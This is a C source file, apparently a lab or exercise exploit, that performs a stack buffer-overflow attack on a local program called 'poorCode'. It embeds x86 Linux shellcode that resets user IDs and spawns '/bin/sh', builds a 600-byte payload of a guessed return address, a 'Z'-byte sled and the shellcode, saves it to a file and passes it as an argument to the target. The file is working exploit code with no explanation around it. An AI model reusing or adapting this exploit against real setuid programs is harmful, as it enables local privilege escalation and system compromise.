#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#define BuffSize 600

char shellcode[] =
        "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
        "\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
        "\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
        "\x68";


unsigned long sp(void)
{
	asm ("movl %esp, %eax");
}

int main(int argc, char *argv[])
{
	int i, offset;
	long esp, ret, *addr_ptr;
	char *buffer, *ptr;
	int sledSize = 100;
	offset = 0;
	esp = sp();
	ret = esp - offset;
	printf("sp = %x\n", sp());
	printf("Stack pointer (ESP) 0x%x\n", esp);
	printf("   Offset from ESP: 0x%x\n", offset);
	printf("Desired Return Addr: %x\n", ret);

	buffer = malloc(BuffSize);

	//Fill entire buffer with desired return address
	ptr = buffer;
	addr_ptr = (long*)ptr;
	for (i=0; i< BuffSize; i+=4) 
	{
		*(addr_ptr++) = ret;
	}
	printf("Filled return\n");

	//First 100 bytes are NOP Sled
	for(i=0; i<sledSize; i++)
	{
		//Converts NOP to Z ascii characters
		//buffer[i] = '\x90';
		buffer[i] = '\x5a';
	}

	printf("added NOP sled\n");
	
	//Put Shellcode after NOP Sled
	ptr = buffer + sledSize;
	for (i=0; i< strlen(shellcode); i++)
	{
		*(ptr++) = shellcode[i];
	}
	
	//End String
	buffer[BuffSize-1] = '\0';


	//Write to File

	FILE *f = fopen("bfOut", "w");
	if (f == NULL)
	{
		printf("Error Opening File\n");
		exit(1);
	}
	for (i=0; i < 600; i++)
	{
		fprintf(f, "%c", buffer[i]);
	}
	fclose(f);

	printf("Inserted shellcode\n");

	execl("./poorCode", "poorCode", buffer, (char *)NULL);
	
	free(buffer);

	return 0;
}
